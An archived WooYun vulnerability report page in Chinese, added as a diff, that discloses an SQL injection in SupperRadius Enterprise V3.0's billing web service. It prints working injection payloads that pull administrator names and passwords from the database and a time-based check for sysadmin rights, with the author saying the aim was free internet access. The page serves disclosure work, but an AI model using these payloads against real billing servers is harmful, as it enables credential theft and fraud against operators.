@@ -1,0 +1,237 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		SupperRadius企业版V3.0 SQL注射漏洞  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		SupperRadius企业版V3.0 SQL注射漏洞  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/applychen">applychen</a> 
+</li><li>提交时间：		2014-01-18 12:16</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2014-01-18：	细节已通知厂商并且等待厂商处理中<br/>
+									2014-01-23：	厂商已经确认，细节仅向厂商公开<br/>
+									2014-02-02：	细节向核心白帽子及相关领域专家公开<br/>
+									2014-02-12：	细节向普通白帽子公开<br/>
+									2014-02-22：	细节向实习白帽子公开<br/>
+									2014-03-04：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">SupperRadius企业版V3.0 SQL注射漏洞</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">家里上网用的宽带恰好是用supperradius来计费的。在企业版中的web services存在一处SQL注射漏洞，能够查询、删除、修改数据库内的账号从而达到免费上网的目的：）<br />
+<br />
+访问以下计费服务器地址：<br />
+<br />
+</p><pre><code>http://192.168.1.1/GateWay/RosApi.asmx</code></pre><p class='detail'><br />
+<br />
+</p><p class="detail"><a href="../images/17211004da50ee91e2df15ae2be2c50dfaa54ade.png" target="_blank"><img src="../images/17211004da50ee91e2df15ae2be2c50dfaa54ade.png" alt="1.png" width="600"/></a></p><p class="detail"><br />
+<br />
+其中的CheckLoginUser与SetUserOffLine能够注入SQL语句：<br />
+<br />
+</p><pre><code>http://192.168.1.1/GateWay/RosApi.asmx?op=CheckLoginUser<br />
+http://192.168.1.1/GateWay/RosApi.asmx?op=SetUserOffLine</code></pre><p class='detail'><br />
+<br />
+</p><p class="detail"><a href="../images/172129266bdfe806c3204cd6f7c8513a232bbc64.png" target="_blank"><img src="../images/172129266bdfe806c3204cd6f7c8513a232bbc64.png" alt="2.png" width="600"/></a></p><p class="detail"><br />
+<br />
+</p><p class="detail"><a href="../images/172129481e4614a12c360a35ed974057f1bbf8fb.png" target="_blank"><img src="../images/172129481e4614a12c360a35ed974057f1bbf8fb.png" alt="3.png" width="600"/></a></p><p class="detail"><br />
+<br />
+将上面的两个POST数据包复制到burp suite中进行提交，首先是CheckLoginUser：<br />
+<br />
+</p><p class="detail"><a href="../images/1721341327ac51ab3c027b29c1b76665a87b14cc.png" target="_blank"><img src="../images/1721341327ac51ab3c027b29c1b76665a87b14cc.png" alt="4.png" width="600"/></a></p><p class="detail"><br />
+<br />
+上图中的userid与gid节点都能够实施注入，返回如下图：<br />
+<br />
+</p><p class="detail"><a href="../images/17213646be88f0c4d669f3fb1685060540b31515.png" target="_blank"><img src="../images/17213646be88f0c4d669f3fb1685060540b31515.png" alt="5.png" width="600"/></a></p><p class="detail"><br />
+<br />
+下面查询sr_ent_sysmember中的数据：<br />
+<br />
+</p><pre><code>1&#039;and 1=(select top 1 name from sr_ent_sysmember)--</code></pre><p class='detail'><br />
+<br />
+</p><p class="detail"><a href="../images/17215238d6e3e9e9013a30af7ba6406110a44516.png" target="_blank"><img src="../images/17215238d6e3e9e9013a30af7ba6406110a44516.png" alt="6.png" width="600"/></a></p><p class="detail"><br />
+<br />
+</p><pre><code>1&#039;and 1=(select pwd from sr_ent_sysmember where name=&#039;myradius&#039;)--</code></pre><p class='detail'><br />
+<br />
+</p><p class="detail"><a href="../images/172151260488dfcaf168ba46287d818b872a9d53.png" target="_blank"><img src="../images/172151260488dfcaf168ba46287d818b872a9d53.png" alt="7.png" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+SetUserOffLine中的注入是基于时间延迟，查询是否为sysadmin角色，是的话就延迟10秒：<br />
+<br />
+</p><pre><code>1&#039;;if(select is_srvrolemember(&#039;sysadmin&#039;))=1 waitfor delay &#039;0:0:10&#039;--</code></pre><p class='detail'><br />
+<br />
+</p><p class="detail"><a href="../images/17215641c10ae4abc1bda426e4a591243902da79.png" target="_blank"><img src="../images/17215641c10ae4abc1bda426e4a591243902da79.png" alt="8.png" width="600"/></a></p><p class="detail"><br />
+<br />
+提交查询之后页面很明显的进入延迟状态，说明当前角色为sa。<br />
+<br />
+使用账号密码进入到后台：<br />
+<br />
+</p><p class="detail"><a href="../images/172202426c2fa83aeb126961c7981a66a2bfe724.png" target="_blank"><img src="../images/172202426c2fa83aeb126961c7981a66a2bfe724.png" alt="9.png" width="600"/></a></p><p class="detail"><br />
+<br />
+</p><p class="detail"><a href="../images/17220417a9d661e848a8cfbb29c69e8764170109.png" target="_blank"><img src="../images/17220417a9d661e848a8cfbb29c69e8764170109.png" alt="10.png" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+ </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail">同上。 </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">过滤变量。 </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/applychen" title="applychen">applychen</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-049209" title="SupperRadius企业版V3.0 SQL注射漏洞">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：高</p>
+						<p class="detail">漏洞Rank：12 </p>
+													<p class="detail">确认时间：2014-01-23 08:22</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">涉及内部网络系统，暂未能直接确认或本地复现，为做好处置，已经由CNVD通过公开联系渠道向软件生产厂商进行了通报，由其进行确认和反馈。</p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="49209";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
